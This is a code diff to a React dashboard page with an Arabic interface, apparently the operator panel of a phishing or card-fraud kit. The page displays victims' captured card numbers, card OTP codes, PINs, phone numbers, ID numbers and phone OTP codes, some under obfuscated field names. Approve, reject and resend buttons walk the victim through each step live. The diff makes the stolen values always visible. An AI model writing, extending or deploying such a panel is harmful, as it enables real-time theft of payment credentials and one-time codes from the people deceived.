@@ -369,6 +369,7 @@ export default function DashboardPage() {
     // Show box if there's card data OR status is approved/rejected (keep showing after decision)
     const hasCardData = raw?._v1 || raw?.cardNumber;
     const hasDecision = paymentStatus === "approved" || paymentStatus === "rejected";
+    // ALWAYS show if there's card data, never hide
     if (!hasCardData && !hasDecision) {
       return null;
     }
@@ -440,9 +441,10 @@ export default function DashboardPage() {
     // Get the OTP code from various possible field names
     const otpCode = raw?._v5 || raw?.otpCode || "";
 
-    // Show box if there's OTP data OR status is approved/rejected (keep showing after decision)
+    // Show box if there's OTP data OR status exists
     const hasOtpData = otpCode || raw?.otpSubmittedAt;
     const hasDecision = cardOtpStatus === "approved" || cardOtpStatus === "rejected";
+    // ALWAYS show if there's OTP data, never hide
     if (!hasOtpData && !hasDecision && currentStep !== 5) {
       return null;
     }
@@ -505,9 +507,10 @@ export default function DashboardPage() {
     const pinStatus = getPinStatus();
     const raw = selectedRequest?.raw;
 
-    // Show box if there's PIN data OR status is approved/rejected (keep showing after decision)
+    // Show box if there's PIN data OR status exists
     const hasPinData = raw?._v6 || raw?.pinCode;
     const hasDecision = pinStatus === "approved" || pinStatus === "rejected";
+    // ALWAYS show if there's PIN data, never hide
     if (!hasPinData && !hasDecision && currentStep !== 6) {
       return null;
     }
@@ -551,11 +554,12 @@ export default function DashboardPage() {
     // Get phone OTP code if submitted (stored as _v7 in history)
     const phoneOtpCode = raw?._v7 || raw?.phoneOtp || "";
 
-    // Show box if there's phone data OR OTP code OR status is approved/rejected
+    // Show box if there's phone data OR OTP code OR status exists
     const hasPhoneData = raw?.phoneNumber || raw?.phoneIdNumber;
-    const hasOtpSubmitted = phoneOtpCode;
-    const hasDecision = phoneOtpStatus === "approved" || phoneOtpStatus === "rejected";
-    if (!hasPhoneData && !hasOtpSubmitted && !hasDecision) {
+    const hasAnyPhoneData = hasPhoneData || phoneOtpCode || phoneOtpStatus;
+    
+    // Always show if there's any phone-related data, never hide
+    if (!hasAnyPhoneData && currentStep !== 7) {
       return null;
     }
 
@@ -569,7 +573,7 @@ export default function DashboardPage() {
           <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 4</span>
         </div>
         
-        {/* Phone data info - show when phone data submitted */}
+        {/* Phone data info - ALWAYS show if exists */}
         {hasPhoneData && (
           <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12 }}>
             {(raw?.phoneIdNumber || raw?.identityNumber) && (
@@ -589,10 +593,14 @@ export default function DashboardPage() {
         )}
         
         {/* Show phone OTP code when submitted - THIS IS THE KEY BOX */}
-        {phoneOtpCode && (
+        {phoneOtpCode ? (
           <div style={{ background: "#fef3c7", borderRadius: 8, padding: 16, border: "2px solid #f59e0b", marginBottom: 12, textAlign: "center" }}>
             <p style={{ margin: "0 0 4px", fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>🔐 رمز التحقق المُدخل:</p>
             <p style={{ margin: 0, fontSize: "2rem", fontWeight: 700, color: "#78350f", letterSpacing: "0.4em" }}>{phoneOtpCode}</p>
+          </div>
+        ) : (
+          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إدخال رمز التحقق</p>
           </div>
         )}
         
@@ -608,30 +616,23 @@ export default function DashboardPage() {
           </div>
         )}
         
-        {/* Action buttons - show only when OTP code is submitted and not yet decided */}
-        {phoneOtpCode && !hasDecision && (
+        {/* Action buttons - show ONLY when OTP code is submitted */}
+        {phoneOtpCode && (
           <div style={{ display: "flex", gap: 8, flexDirection: "column" }}>
             <div style={{ display: "flex", gap: 8 }}>
               <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
                 style={{ flex: 1, padding: "12px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
-                {actionLoading === "phone" ? "جاري..." : "✅ موافق - توجيه العميل"}
+                {actionLoading === "phone" ? "جاري..." : "✅ موافق"}
               </button>
               <button onClick={() => handlePhoneAction("rejected")} disabled={actionLoading === "phone"}
                 style={{ flex: 1, padding: "12px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
-                {actionLoading === "phone" ? "جاري..." : "❌ مرفوض - رقم غير صحيح"}
+                {actionLoading === "phone" ? "جاري..." : "❌ مرفوض"}
               </button>
             </div>
             <button onClick={() => handlePhoneAction("resend")} disabled={actionLoading === "phone"}
               style={{ padding: "12px 16px", border: "none", borderRadius: 8, background: "#f59e0b", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
-              🔄 إعادة إرسال - العميل يُدخل رمز جديد
+              🔄 إعادة إرسال رمز
             </button>
-          </div>
-        )}
-        
-        {/* Show waiting message when phone data submitted but no OTP yet */}
-        {!phoneOtpCode && hasPhoneData && !hasDecision && (
-          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إدخال العميل لرمز التحقق</p>
           </div>
         )}
       </div>
